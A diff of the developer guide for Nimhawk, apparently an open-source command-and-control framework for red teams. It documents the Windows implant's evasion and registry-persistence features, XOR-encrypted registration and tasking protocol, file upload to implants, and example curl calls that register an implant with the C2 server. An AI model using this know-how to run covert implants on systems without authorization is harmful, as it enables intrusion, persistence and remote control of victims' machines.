@@ -3,181 +3,208 @@
 
   <h1>Nimhawk Developer Guide</h1>
 
-[![PRs Welcome](https://img.shields.io/badge/Contributions-Welcome-brightgreen.svg)](http://makeapullrequest.com)
-[![Platform](https://img.shields.io/badge/Implant-Windows%20x64-blue.svg)](https://github.com/hdbreaker/nimhawk)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Version](https://img.shields.io/badge/Version-1.0-red.svg)](https://github.com/hdbreaker/nimhawk/releases)
+  [![PRs Welcome](https://img.shields.io/badge/Contributions-Welcome-brightgreen.svg)](http://makeapullrequest.com)
+  [![Platform](https://img.shields.io/badge/Implant-Windows%20x64-blue.svg)](https://github.com/hdbreaker/nimhawk)
+  [![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+  [![Version](https://img.shields.io/badge/Version-1.0-red.svg)](https://github.com/hdbreaker/nimhawk/releases)
 </div>
 
-This document provides detailed information about the structure of the Nimhawk project, guidelines for developers who wish to contribute or modify the code, and documentation on recent improvements implemented.
+---
 
-# Table of contents
+> This document provides detailed information about the structure of the Nimhawk project, guidelines for developers who wish to contribute or modify the code, and documentation on recent improvements implemented.
 
-- [Project overview](#project-overview)
-- [Quick start guide](#quick-start-guide)
+## 📑 Table of contents
+
+### Part 1: General Documentation
+<details>
+<summary>Click to expand</summary>
+
+- [Project overview](#-project-overview)
+- [Quick start guide](#-quick-start-guide)
   - [Prerequisites](#prerequisites)
   - [Installation](#installation)
   - [Start the server](#start-the-server)
   - [Access the web interface](#access-the-web-interface)
-- [Project architecture](#project-architecture)
+- [Project architecture](#-project-architecture)
   - [Project structure](#project-structure)
   - [Main components](#main-components)
-    - [Implant](#implant)
-    - [Backend Server](#backend-server)
-    - [Admin Web Interface](#admin-web-interface)
-    - [Database](#database)
   - [Communication flow](#communication-flow)
-- [Development guide](#development-guide)
+- [Development guide](#-development-guide)
   - [Development environment setup](#development-environment-setup)
-    - [Python Environment](#python-environment)
-    - [UI Development](#ui-development)
-    - [Cross-Compiling with nim.cfg](#cross-compiling-with-nim.cfg)
   - [Adding new features](#adding-new-features)
-- [IMPORTANT: Adding New Configuration Parameters in config.toml file and how to propagate it](#important-adding-new-configuration-parameters-in-config.toml-file-and-how-to-propagate-it)
-  - [Adding a New Parameter to config.toml and read it from Implant at compile-time](#adding-a-new-parameter-to-config.toml-and-read-it-from-implant-at-compile-time)
-  - [Storing the Parameter in the Database](#storing-the-parameter-in-the-database)
-  - [Propagating the Parameter to the Frontend](#propagating-the-parameter-to-the-frontend)
-  - [Understanding getServerInfo Function](#understanding-getserverinfo-function)
-- [Security considerations](#security-considerations)
-  - [Agent Security](#agent-security)
-  - [Server Security](#server-security)
-  - [UI Security](#ui-security)
-- [Pull request process](#pull-request-process)
-- [Feature documentation](#feature-documentation)
-  - [Enhanced reconnection system](#enhanced-reconnection-system)
-  - [Multi-status implant support](#multi-status-implant-support)
-  - [Search and filtering capabilities](#search-and-filtering-capabilities)
-  - [User interface improvements](#user-interface-improvements)
-  - [Implant deletion API](#implant-deletion-api)
-- [Subsystem architecture](#subsystem-architecture)
-  - [Workspace system architecture](#workspace-system-architecture)
-  - [File exchange system implementation](#file-exchange-system-implementation)
-- [Future plans](#future-plans)
-- [Contributing](#contributing)
-  - [Contributing Guidelines](#contributing-guidelines)
-  - [Contributing to the reconnection system](#contributing-to-the-reconnection-system)
-- [License](#license)
-- [If You've Reached This Point](#if-youve-reached-this-point)
-- [Support the project](#support-the-project)
+- [Configuration Parameters](#-configuration-parameters)
+  - [Adding New Parameters](#adding-new-parameters)
+  - [Parameter Storage](#parameter-storage)
+  - [Frontend Integration](#frontend-integration)
+- [Security considerations](#-security-considerations)
+- [Pull request process](#-pull-request-process)
+- [Support the Project](#support-the-project)
+</details>
 
-## Project overview
+### Part 2: Implant Development
+<details>
+<summary>Click to expand</summary>
 
-Nimhawk is a modular Command & Control (C2) framework designed with security, flexibility, and extensibility in mind. The project is heavily based on [NimPlant](https://github.com/chvancooten/NimPlant) by [Cas van Cooten](https://github.com/chvancooten) ([@chvancooten](https://twitter.com/chvancooten)), whose excellent work provided the foundation for this project.
+- [How to develop your own Implant](#how-to-develop-your-own-implant-or-extend-implant-functionality)
+  - [Overview](#overview)
+  - [Headers and Workspace configuration](#headers-and-workspace-configuration)
+  - [Communication Routes](#communication-routes)
+  - [Implants Server API Endpoints Documentation](#implants-server-api-endpoints-documentation)
+    - [Registration Flow](#registration-flow-how-an-implant-call-home-for-first-time---implant-server)
+    - [Task Flow](#task-flow-how-an-implant-get-a-task-to-execute---implant-server)
+    - [Command Submission Flow](#command-subition-flow-how-an-implant-sends-commands-output-to-c2-server---implant-server)
+    - [Implant Reconnection Flow](#implant-reconnection-flow-how-an-implant-exchange-unique_xor_key-with-c2-if-process-restart-or-a-system-reboots-happens---implant-server)
+  - [Test Script](#test-script)
+</details>
+
+## 🔍 Project overview
+
+Nimhawk is a modular Command & Control (C2) framework designed with security, flexibility, and extensibility in mind. The project is heavily based on [NimPlant](https://github.com/chvancooten/NimPlant) by [Cas van Cooten](https://github.com/chvancooten) ([@chvancooten](https://twitter.com/chvancooten)).
+
+### Core Components
+
+| Component | Description |
+|-----------|-------------|
+| **Implant** | Written in Nim for cross-platform compatibility and evasion |
+| **Server** | Python-based C2 infrastructure with Admin and Implant servers |
+| **Admin UI** | Modern web interface built with React/Next.js and Mantine |
 
 Nimhawk consists of three main components:
 - **Implant**: Written in Nim for cross-platform compatibility and evasion
-- **Server**: Python-based C2 infrastructure with two separate server components
+- **Server**: Python-based C2 infrastructure with two separate server components 
+    - Admin Server
+    - Implant Server
 - **Admin UI**: Modern web interface built with React/Next.js and Mantine
 
 The framework builds upon NimPlant's core functionality while adding enhanced features such as a modular architecture, improved security measures, and a completely renovated graphical interface with modern authentication.
 
-## Support the project
+<details>
+<summary><strong>Key Features</strong></summary>
 
-If you find Nimhawk useful for your work, consider supporting the project:
+### HTTP(S) Authentication & Communication:
+- Machine-to-machine authentication using HTTP headers:
+  - X-Correlation-ID: Pre-shared key for implant authentication
+  - X-Request-ID: Unique implant identifier
+  - X-Robots-Tag: Workspace UUID for operation segregation
+- Customizable communication paths for:
+  - Registration (/register)
+  - Task retrieval (/task)
+  - Result submission (/result)
+  - Reconnection handling (/reconnect)
+- Configurable User-Agent strings for OPSEC
 
-[![Buy Me A Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/hdbreaker9s)
+### Communication Security:
+- Dual XOR key encryption system:
+  - Initial XOR Key: Embedded at compile-time for registration and persistence
+  - Unique XOR Key: Generated per-session for secure command & control
+- Base64 encoding for reliable data transmission
+- Encrypted headers for enhanced OPSEC
+- Customizable HTTP(S) paths and User-Agent strings
 
-## Quick start guide
+### Operational Reliability:
+- Advanced reconnection system with exponential backoff
+- Registry-based persistence mechanism
+- Mutex implementation preventing multiple instances
+- Comprehensive error handling for network disruptions
+- Automatic cleanup of registry artifacts
 
-### Prerequisites
-- Python 3.8+
-- Nim compiler (if building implants from source)
-- MinGW (for cross-compilation from Linux/macOS)
+### Command & Control:
+- Modular command execution framework
+- File transfer capabilities with compression
+- Secure task retrieval and result submission
+- Support for multiple command types:
+  - Filesystem operations
+  - Network commands
+  - Process execution
+  - System enumeration
 
-### Installation
-```bash
-# Clone the repository
-git clone https://github.com/hdbreaker/nimhawk.git
-cd nimhawk
+### Operational Security:
+- Workspace segregation for operation management
+- Encrypted file and command transmission
+- Status-aware operation modes:
+  - Active/Late/Disconnected states
+  - Graceful session handling
+  - Clean termination procedures
 
-# Create configuration
-cp config.toml.example config.toml
-# Edit config.toml with your settings
+### Integration Features:
+- SQLite database interaction
+- REST API communication
+- Real-time status monitoring
+- Cross-platform compilation support
+- Configurable through config.toml
 
-# Create Python virtual environment
-cd server
-python3 -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-```
+### Development Features:
+- Modular architecture for easy extension
+- Comprehensive logging system
+- Test suite for API endpoints
+- Development tools in dev_utils/
+- Documentation for custom module development
 
-### Start the server
-```bash
-python3 nimhawk.py server
-```
+</details>
 
-### Access the web interface
-Open `http://localhost:5000` in your browser (or the configured port)
-- Default credentials: admin@nimhawk.com / P4ssw0rd123$
-
-## Project architecture
-
-### Project structure
+## Project structure
 
 The project structure has been reorganized to improve modularity and facilitate collaborative development:
 
 ```
 Nimhawk/
-├── docs/                       # Documentation and images
-│   └── images/                 # Screenshots and images
+├── .devcontainer/            # Container development configuration
+├── .github/                  # GitHub configuration and workflows
+├── docs/                     # Project documentation and resources
+│   └── images/               # Screenshots and images
 │
-├── implant/                    # Nim implant source code
-│   ├── NimPlant.nim            # Main implant entry point
-│   ├── NimPlant.nimble         # Nim package configuration
-│   ├── nim.cfg                 # Nim compiler configuration
-│   ├── modules/                # Specific functionality modules
-│   ├── config/                 # Implant configuration handling
-│   ├── core/                   # Core functionality
-│   ├── selfProtections/        # Evasion and protection mechanisms
-│   └── util/                   # General utilities
+├── implant/                  # Nim implant source code
+│   ├── NimPlant.nim          # Main implant entry point
+│   ├── implant.nimble        # Nim package configuration
+│   ├── nim.cfg               # Nim compiler configuration
+│   ├── modules/              # Specific functionality modules
+│   ├── config/               # Implant configuration
+│   ├── core/                 # Core functionality
+│   ├── selfProtections/      # Evasion and protection mechanisms
+│   └── util/                 # General utilities
 │
-├── server/                     # Server component
-│   ├── admin_web_ui/           # Web administration interface
-│   │   ├── components/         # Reusable React components
-│   │   ├── modules/            # Business logic modules
-│   │   ├── pages/              # Next.js pages
-│   │   └── ...                 # Other UI files
+├── server/                   # Server component
+│   ├── admin_web_ui/         # Web administration interface
+│   │   ├── components/       # Reusable React components
+│   │   ├── modules/          # Business logic modules
+│   │   ├── pages/            # Next.js pages
+│   │   └── ...               # Other UI files
 │   │
-│   ├── src/                    # Server source code
-│   │   ├── config/             # Server configuration
-│   │   ├── servers/            # Server implementations
-│   │   │   ├── admin_api/      # Admin interface API
-│   │   │   └── implants_api/   # Implant communication API
-│   │   │
-│   │   └── util/               # Server utilities
+│   ├── src/                  # Server source code
+│   │   ├── config/           # Server configuration
+│   │   ├── servers/          # Server implementations
+│   │   │   ├── admin_api/    # Administration API
+│   │   │   └── implants_api/ # Implant communication API
+│   │   └── util/             # Server utilities
 │   │
-│   ├── downloads/              # Files downloaded from implants
-│   ├── logs/                   # Server and implant logs
-│   └── uploads/                # Files to upload to implants
+│   ├── downloads/            # Files downloaded from implants
+│   ├── logs/                 # Server logs
+│   └── uploads/              # Files to upload to implants
 │
-├── detection/                  # Detection analysis tools 
+├── dev_utils/                # Development tools
+├── detection/                # Detection analysis tools
 │
-├── config.toml.example         # Example configuration file template
-├── nimhawk.py                  # Main script for managing the C2
-├── LICENSE                     # License information
-├── README.md                   # Main documentation
-└── DEVELOPERS.md               # This development guide
+├── .dockerignore             # Docker ignored files
+├── .gitignore                # Git ignored files
+├── .xorkey                   # XOR key for the project, it will be auto-generated 
+├── config.toml               # Current configuration
+├── config.toml.example       # Configuration template
+├── Dockerfile                # Docker configuration
+├── LICENSE                   # License information
+├── README.md                 # Main documentation
+├── DEVELOPERS.md             # Development guide
+└── nimhawk.py                # Main management script
 ```
 
-### Main components
+## Main components
 
-#### 1. Implant
+### 1. Implant
 
-The Nimhawk implant is written in Nim to provide a lightweight, evasive implant with HTTP(S) communication capabilities. It builds upon the foundation created by [Cas van Cooten](https://github.com/chvancooten) in NimPlant.
+The Nimhawk implant is written in Nim, providing a sophisticated, lightweight, and evasive HTTP(S) agent. Building upon NimPlant's foundation by [Cas van Cooten](https://github.com/chvancooten), it implements enhanced security features and operational capabilities.
 
-**Key implant features:**
-- Reconnection system with exponential backoff
-- Secure encryption key transfer
-- Mutex to prevent multiple simultaneous executions
-- Enhanced registry management with proper cleanup during reconnection
-- Encrypted communication with the server
-- Support for various command types (filesystem, network, execution, etc.)
-- Robust error handling for network disconnection scenarios
-- Workspaces for Improved Operation Segregation: Utilizes workspaces to segregate operations, enhancing organization and management of implants within different operational contexts.
+### 2. Backend Server
 
-#### 2. Backend Server
-
-The Nimhawk backend is written in Python and consists of three independent servers ( Two are really important and the other one if a Worker that update stuff in backgroupd ):
+The Nimhawk backend is written in Python and consists of three independent servers (Two are really important and the other one is a Worker that update stuff in backgroupd)
 
 **Implants Server:**
 - Exclusively handles communication with implants
@@ -190,19 +217,11 @@ The Nimhawk backend is written in Python and consists of three independent serve
 - Manages user authentication and authorization
 - Never communicates directly with implants
 - Interacts with the database for CRUD operations
-- Can be configured in API-only mode by setting Flask's static folders to None
 
 **Periodic Implant Checks:**
-- Provides the REST API for the web interface
-- Manages user authentication and authorization
-- Never communicates directly with implants
-- Interacts with the database for CRUD operations
-- Can be configured in API-only mode by setting Flask's static folders to None
-
-**UI Development in API-Only Mode:**
 - The primary role of periodic_implant_checks is to periodically verify the status of implants to identify any that have not checked in within the expected timeframe. This helps in maintaining the operational integrity of the system by ensuring that all implants are active and communicating as expected.
 
-#### 3. Admin Web Interface
+### 3. Admin Web Interface
 
 The web interface is built with React/Next.js and the Mantine component framework:
 
@@ -213,7 +232,7 @@ The web interface is built with React/Next.js and the Mantine component framewor
 - Real-time visualization of information and results
 - Detailed panels for implant management
 
-#### 4. Database
+### 4. Database
 
 Nimhawk uses SQLite to store all information:
 
@@ -221,27 +240,27 @@ Nimhawk uses SQLite to store all information:
 - Both servers (Implants and Admin) read from and write to this database
 - Serves as the data coordination point between components
 
-### Communication flow
+## Communication flow
 
 The project architecture implements strictly separated communication paths:
 
-1. **Implant ↔ Implants Server**:
+1. **Implants ↔ Implants Server (implants_server_init.py)**:
    - HTTP(S) communication with customizable paths
-   - Authentication via pre-shared key (`httpAllowCommunicationKey`)
+   - Implants authentication via pre-shared key (`httpAllowCommunicationKey`)
    - Custom HTTP headers for authentication (`X-Correlation-ID`)
-   - The `X-Robots-Tag` header is used to transport the workspace_uuid during communication, ensuring each implant is correctly associated with its workspace
+   - The `X-Robots-Tag` header is used to transport the workspace_uuid during communication
    - Improved reconnection mechanism with registry cleanup and proper error handling
    - Status code-based response handling for better reliability
    - Automatic retry logic with exponential backoff
 
-2. **Web UI ↔ Admin API Server**:
+2. **Operator Dashboard ↔ Admin Server (admin_server_init.py)**:
    - HTTPS communication with REST API
    - Authentication based on usernames and passwords
    - Session management with configurable expiration
 
 3. **Data Coordination**:
    - SQLite database as central storage point
-   - No direct communication between implants and web UI
+   - No direct communication between Implant Server and Admin Server
    - All data shared through the database
 
 ## Development guide
@@ -273,6 +292,9 @@ Nimhawk's server component uses Python virtual environments to manage dependenci
    pip install -r requirements.txt
    ```
 
+3. **Install nim >= 1.6.12**
+   Refer to: https://nim-lang.org/install.html
+
 #### UI Development
 
 The web interface is built with Next.js and uses npm for dependency management and development workflows. Here's how to set up and run the UI in development mode:
@@ -292,7 +314,9 @@ The web interface is built with Next.js and uses npm for dependency management a
    npm run dev
    
    # Build the production version of the UI
-   npm run build
+   # maybe could break due to development packages and lint error, 
+   # in general just use: npm run dev
+   npm run build 
    
    # Run compiled version of the UI
    npm run start
@@ -302,22 +326,13 @@ The web interface is built with Next.js and uses npm for dependency management a
    ```
 
 3. **Development workflow**:
+   - Review Frontend .env file and adjust to proper Servers IPs
    - Make changes to components in the `components/` directory
    - Modify pages in the `pages/` directory
    - Changes will automatically reload in the browser
    - Ensure that the backend server is running for API calls to work
-   - The backend serves the production build, but during development, you'll connect to the backend API directly from the Next.js dev server
 
-4. **Building for production**:
-   ```bash
-   # Build the UI for production
-   npm run build
-   
-   # The output will be placed in the .next/ directory
-   # The backend server will serve these files automatically
-   ```
-
-When working in development mode, the UI will run on port 3000, while the backend API typically runs on port 5000. The development server is configured to proxy API requests to the backend server, so both need to be running simultaneously during development.
+When working in development mode, the UI will run on port 3000, while the backend API typically runs on port 9669 and 80. 
 
 #### Cross-Compiling with nim.cfg
 
@@ -337,36 +352,33 @@ For building Windows payloads from Linux or macOS:
 
 3. **Configure nim.cfg** with the correct paths to the MinGW toolchain
 
-### Adding new features
-
-#### 1. Implant Modules
-- Create new module in appropriate directory under `implant/modules/`
-- Implement command handler
-- Register in command parser
-- Update documentation and help system
-
-#### 2. Server Endpoints
-- Add route handler in the appropriate server (implants or admin)
-- Implement business logic
-- Update API documentation
-- Add security measures
-
-#### 3. UI Components
-- Create React component in `server/admin_web_ui/components/`
-- Add to component library
-- Implement state management
-- Add styling
-
-
-## IMPORTANT: Adding New Configuration Parameters in config.toml file and how to propagete it
+## Adding new configuration parameters in config.toml file and how to propagete it
 
 This section outlines the complete process for adding and propagating new configuration parameters in Nimhawk, from the config.toml file to the user interface.
 
-### Configuration Flow
+### Configuration Flows
 
+Nimhawk has two distinct configuration flows:
+
+1. **Compilation Flow (Implant)**:
 ```
-config.toml → implant/config/configParser.nim (compilation) → db.py (storage) → admin_server_init.py (API) → nimplant.ts (frontend)
+config.toml → implant/config/configParser.nim → Implant binary
 ```
+This flow handles configurations that need to be embedded in the implant during compilation, such as:
+- INITIAL_XOR_KEY
+- Communication paths
+- User-Agent
+- Other static parameters
+
+2. **Server Flow (Runtime)**:
+```
+config.toml → admin_server_init.py/implants_server_init.py → db.py → frontend (nimplant.ts)
+```
+This flow handles dynamic configuration of the server and web interface, including:
+- Workspace configuration
+- Authentication parameters
+- Endpoint configuration
+- Implant states
 
 ### 1. Adding a New Parameter to `config.toml` and read it from Implant at compile-time
 
@@ -461,7 +473,7 @@ const { serverInfo } = getServerInfo()
 return <DataRow label="New Parameter" value={serverInfo.newParameter} />
 ```
 
-### Complete Example: Adding Sleep Jitter Parameter
+**Complete Example: Adding Sleep Jitter Parameter**
 
 This comprehensive example demonstrates the full flow:
 
@@ -503,26 +515,869 @@ This comprehensive example demonstrates the full flow:
 
 When the frontend connects with the backend after logging in, the first action it performs is calling `getServerInfo`. This function populates the `serverInfo` object in `modules/nimplant.ts` with the backend settings. This is how configuration data flows from the backend to the frontend in Nimhawk.
 
-### Security considerations
+# How to develop your own Implant or extend Implant functionality
 
-#### 1. Agent Security
-- Use encrypted communication
-- Minimize detection surface
-- Implement evasion techniques where appropriate
+## Overview
 
-#### 2. Server Security
-- Validate all input
-- Implement rate limiting
-- Use secure sessions
-- Monitor for abuse
+The communication between the Implant and the C2 server is handled by three main components:
 
-#### 3. UI Security
-- Implement robust authentication
-- Validate user input
-- Use secure protocols
-- Handle sensitive data properly
+- Admin Server: `server/src/servers/admin_api/admin_server_init.py`
+- Implant Server: `server/src/servers/implants_api/implants_server_init.py`
+- Implant Call to Home file: `implant/core/webClientListener.nim` (handles the core HTTP communications)
 
-### Pull request process
+The system employs a dual XOR key encryption strategy for enhanced security. Throughout this document, we will refer to these keys as follows:
+
+1. **Initial XOR Key**:
+   - Embedded in the implant binary at compile time
+   - Used for initial registration handshake and registry operations
+   - Handles registry persistence in `register.nim`
+   - Remains constant throughout the implant's lifecycle
+   - Used for reconnection process when recovering from disconnection
+
+2. **Unique XOR Key**:
+   - Generated by server during successful registration
+   - Used for all subsequent communications including:
+     - Command encryption/decryption
+     - File transfer operations
+     - Result submission
+     - Task retrieval
+   - Unique per implant instance
+   - Refreshed during reconnection process
+
+All encrypted data is base64 encoded to prevent null bytes from breaking HTTP communication. This dual-key approach ensures secure persistence while maintaining unique encryption channels for each implant's communications.
+
+IMPORTANT: Remember, you can always grep for UNIQUE_XOR_KEY and INITIAL_XOR_KEY to understand which one is being used in a specific process.
+
+**How Nimhawk implement XOR Encryption and Usage**:
+1. **Key Generation**:
+   - At startup, `nimhawk.py` generates a random **Initial XOR key**
+   - Key is stored in `.xorkey` file for consistency
+   - Default key (459457925) is used if `.xorkey` doesn't exist
+
+2. **Implant Compilation Process** 
+
+   This section will explain how to pass compile time constants to implant at detail, it will help you if you want to add new compile time constants to implant.
+
+   - **Initial XOR Key** is passed to Nim compiler via nim compiling flag `-d:INITIAL_XOR_KEY=<key>` (read nimhawk.py)
+   - In `configParser.nim`, the XOR KEY is defined as:
+     ```nim
+     const INITIAL_XOR_KEY {.intdefine.}: int = 459457925
+     ```
+   - During compilation, `{.intdefine.}` directive substitutes the default value with the **Initial XOR Key**
+
+3. **Dual Encryption System**:
+   - **Initial XOR Key**:
+     - Used for initial registration handshake
+     - Used to encrypt the ID stored in registry
+     - Embedded in the binary at compile time
+     - Ensures secure initial communication
+     - Used for registry operations
+   
+   - **Unique XOR Key**:
+     - Generated by server during implant registration
+     - Sent to implant in base64 format
+     - Used for all subsequent communications
+     - Provides unique encryption per implant
+     - Lost after process termination/reboot
+     - Recovered via reconnect endpoint
+
+
+## Headers and Workspace configuration:
+
+### Implants Headers required to talk with Implant Server
+| Header | Value | Description | Required |
+|--------|-------|-------------|-----------|
+| X-Correlation-ID | `<http_allow_key>` | Authentication key for machine-to-machine communication | Yes |
+| User-Agent | `<user_agent>` | Custom user agent string configured in config.toml | Yes |
+| X-Request-ID | `<implant_guid>` | Unique identifier for the implant | Yes |
+| X-Robots-Tag | `<workspace_uuid>` | Workspace identifier for operational segmentation | No |
+
+
+
+## Communication Routes
+
+Routes are configured in `config.toml` with the following default values:
+
+| Route | Path | Description |
+|-------|------|-------------|
+| Register | `/register` | Initial registration and activation of implants |
+| Task | `/task` | Command delivery and file uploads |
+| Result | `/result` | Command output submission |
+| Reconnect | `/reconnect` | Reconnection handling for existing implants |
+
+## Implants Server API Endpoints Documentation
+
+### Registration Flow (How an Implant Call Home for first time) - Implant Server
+
+**Purpose**: Handles initial implant registration and activation.
+
+**Methods**: 
+- GET: Initial registration request
+- POST: Activation with implant information
+
+**Headers required**:
+
+| Header | Value | Description | Required |
+|--------|-------|-------------|-----------|
+| X-Correlation-ID | `<http_allow_key>` | Authentication key for machine-to-machine communication | Yes |
+| User-Agent | `<user_agent>` | Custom user agent string configured in config.toml | Yes |
+| X-Robots-Tag | `<workspace_uuid>` | Workspace identifier for operational segmentation | No |
+
+### 1. Register Endpoint GET Flow (`/register`)
+
+**GET Request Flow**:
+```
++----------------+              +----------------+              +----------------+
+|    Implant     |              |    Server      |              |   Database     |
++----------------+              +----------------+              +----------------+
+        |                                |                               |
+        |-------- GET /register -------> |                               |
+        |                                |                               |
+        |                                |---- Generate Implant GUID     |
+        |                                |---- Store Implant GUID -----> |
+        |                                |---- Generate Unique XOR Key   |
+        |                                |---- Store Unique XOR Key ---> |
+        |<-- GUID + Unique XOR Key ------|                               |
+        |                                |                               |
++----------------+                +----------------+              +----------------+
+```
+
+Explained Flow:
+1. Implant sends GET request to /register with authentication headers
+2. Server generates new GUID and an Implant's Unique XOR Key (will be used in future operations)
+3. Server returns JSON with GUID and Unique XOR Key in base64
+
+---------------------------------------------------------------------------------------------
+
+### 2. Register Endpoint POST Flow
+**POST Request Flow**:
+
+Communication Diagram:
+```
++----------------+     +----------------+     +----------------+
+|    Implant     |     |    Server      |     |   Database     |
++----------------+     +----------------+     +----------------+
+        |                     |                      |
+        |-- POST /register -->|                      |
+        |                     |-- Store implant ---->|
+        |                     |                      |
+        |<-- 200 OK ----------|                      |
+        |                     |                      |
++----------------+     +----------------+     +----------------+
+```
+
+Explained Flow:
+1. Implant sends system information encrypted with Unique XOR Key
+2. Server decrypts and validates the information
+3. Server stores the implant in the database
+4. Server confirms successful activation to Implant
+
+
+4. **Runtime Usage**:
+   - After Registration GET Flow, implant switches to unique runtime key for communication (Unique XOR Key)
+   - If Unique XOR Key is lost, `/reconnect` endpoint will provides the Implant with its Unique XOR Key again
+   - Important: Initial XOR Key continues to be used in Implant lifecycle, for example in registry operations between process restart or system     reboots. 
+      - Also, Initial XOR Key is an important component in the reconnection process (look at `/reconnect` endpoint documentation)
+
+**Example CURL**:
+```bash
+# GET Request, internally in this process INITIAL XOR KEY is used.
+curl -X GET "http://server:port/register" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
+  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
+
+# POST Request, from this and on UNIQUE XOR KEY is used for communication process. 
+curl -X POST "http://server:port/register" \
+  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko" \
+  -H "X-Correlation-ID: PASIOnodnoqonasond12314" \
+  -H "X-Request-ID: <guid>" \
+  -d '{"data": "<base64_encoded_unique_xor_encrypted_system_info>"}'
+```
+
+### Task Flow (How an Implant get a task to execute) - Implant Server
+### 1. Task Endpoint (`/task`)
+
+**Purpose**: Delivers commands and handles file uploads to Implant.
+
+**Methods**: 
+- GET: Retrieve pending commands
+- GET `/task/<file_id>`: Download files for upload command
+
+**Headers Required**:
+
+| Header | Value | Description |
+|--------|-------|-------------|
+| X-Request-ID | `<implant_guid>` | Unique identifier for the implant |
+| User-Agent | `<user_agent>` | Configured user agent |
+| X-Correlation-ID | `<http_allow_key>` | Authentication key for machine-to-machine 
+| Content-MD5 | `<task_guid>` | Task GUID (only for file downloads) |
+
+
+### Task flow: Execute a command
+
+**Execute a Command Flow**:
+
+Communication Diagram:
+```
++----------------+     +----------------+     +----------------+
+|    Implant     |     |    Server      |     |   Database     |
++----------------+     +----------------+     +----------------+
+        |                     |                      |
+        |-- GET /task ------->|                      |
+        |                     |-- Query tasks ------>|
+        |                     |<-- Return tasks -----|
+        |                     |                      |
+        |<-- Tasks -----------|                      |
+        |                     |                      |
++----------------+     +----------------+     +----------------+
+```
+
+Explained Flow:
+1. Implant requests pending tasks
+2. Server queries tasks in the database
+3. Server returns encrypted tasks to the implant (using UNIQUE_XOR_KEY)
+
+1. **Task Retrieval** (`getQueuedCommand` function):
+   - Implant sends GET request to `/task` endpoint
+   - Request includes:
+     - `X-Request-ID`: Implant's unique identifier
+     - `User-Agent`: Configured user agent
+     - `X-Correlation-ID`: HTTP authentication key
+   - Server responds with encrypted task data containing:
+     - Task GUID
+     - Command to execute
+     - Command arguments
+
+2. **Task Processing**:
+   - Implant decrypts task data using its Unique XOR Key
+   - Implant parses JSON response (`webClientListener.nim`) into a `Command Object`: 
+     ```nim
+     type Command = object
+       guid: string
+       command: string
+       args: seq[string]
+     ```
+
+3. **Result Submission** (`postCommandResults` function):
+   - After command execution, implant prepares result data:
+   - Result is encrypted using Unique XOR Key
+   - POST request sent to `/result` endpoint with:
+     - Encrypted command output
+     - Original task GUID for correlation
+
+    ```nim
+    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
+    discard doRequest(li, li.resultPath, "data", encryptData(data, li.UNIQUE_XOR_KEY), "post")
+     ```
+   - Server confirms reception with 200 OK response
+
+**Error Handling**:
+- If server returns non-200 status code, implant marks it as "NIMPLANT_CONNECTION_ERROR"
+- Failed task parsing is handled gracefully, returning empty command and GUID
+- All communication is encrypted using implant's unique XOR key
+- Base64 encoding prevents issues with binary data transmission
+
+This process ensures secure, reliable command execution and result reporting between the implant and C2 server.
+
+---------------------------------------------------------------------------------------------
+
+### 2. Task Flow: Upload a file to Implant
+
+This process flow is composed by two process under the hood.
+
+**Execute a Command Flow**:
+
+
+Communication Diagrams:
+```
+# Admin Server:
+# . Operator upload a file and task Implant to download de file.
+
++----------------+     +------------------+        +----------------+     
+|    Operator    |     |   Admin Server   |        |     SQLite     |     
+|   Dashboard    |     |    (REST API)    |        |   Database     |     
++----------------+     +------------------+        +----------------+     
+        |                      |                          |                      
+        |                      |                          |                      
+        |-- Upload File ------>|                          |                      
+        |                      |-- Store File ----------> |                      
+        |                      |  File Hash ID + Metadata |                      
+        |<-- Upload Success ---|                          |                      
+        |                      |                          |                      
+        |-- Queue "upload"---> |                          |                      
+        |     Command          |                          |                      
+        |                      |-- Store Task ----------> |                      
+        |                      |                          |                      
++----------------+     +----------------+        +----------------+             
+``` 
+
+```
+# Implant Server:
+# . Implant ask Implant Server for task, receive 'upload' command and FILE HASH ID
+# . Download FILE to Disk
+
++----------------+             +----------------+     +----------------+     +----------------+
+|    Implant     |             |Implant Server |     |    SQLite      |     |  File System   |
+|   (Windows)    |             |   (HTTP/S)    |     |   Database     |     |   (uploads/)   |
++----------------+             +----------------+     +----------------+     +----------------+
+        |                             |                     |                     |
+        | GET /task                   |                     |                     |
+        |---------------------------> |                     |                     |
+        |                             |                     |                     |
+        |                             | Query Tasks         |                     |
+        |                             |-------------------->|                     |
+        |                             |                     |                     |
+        |                             | Return Task         |                     |
+        |                             |<--------------------|                     |
+        |                             |                     |                     |
+        | Return "upload" command     |                     |                     |
+        |<--------------------------- |                     |                     |
+        |                             |                     |                     |
+        | GET /task/{file_hash_id}    |                     |                     |
+        | Headers:                    |                     |                     |
+        | - X-Request-ID              |                     |                     |
+        |   (Implant GUID)            |                     |                     |
+        | - Content-MD5               |                     |                     |
+        |   (Task GUID)               |                     |                     |
+        |---------------------------> |                     |                     |
+        |                             |                     |                     |
+        |                             | Query File Info     |                     |
+        |                             |-------------------->|                     |
+        |                             |                     |                     |
+        |                             | Return File Info    |                     |
+        |                             |<--------------------|                     |
+        |                             |                     |                     |
+        |                             | Read File           |                     |
+        |                             |------------------------------------------>|
+        |                             |                     |                     |
+        |                             | Return File Content |                     |
+        |                             |<----------------------------------------> |
+        |                             |                     |                     |
+        |                             | Process File:       |                     |
+        |                             | 1. Compress         |                     |
+        |                             | 2. Encrypt XOR      |                     |
+        |                             | 3. Base64 encode    |                     |
+        |                             |                     |                     |
+        | Return File name and content|                     |                     |
+        | - X-Original-Filename       |                     |                     |
+        |   (encrypted name)          |                     |                     |
+        |<--------------------------- |                     |                     |
+        |                             |                     |                     |
+        | Process File:               |                     |                     |
+        | 1. Base64 decode            |                     |                     |
+        | 2. XOR decrypt              |                     |                     |
+        | 3. Decompress               |                     |                     |
+        | 4. Save File                |                     |                     |
+        |                             |                     |                     |
+```
+
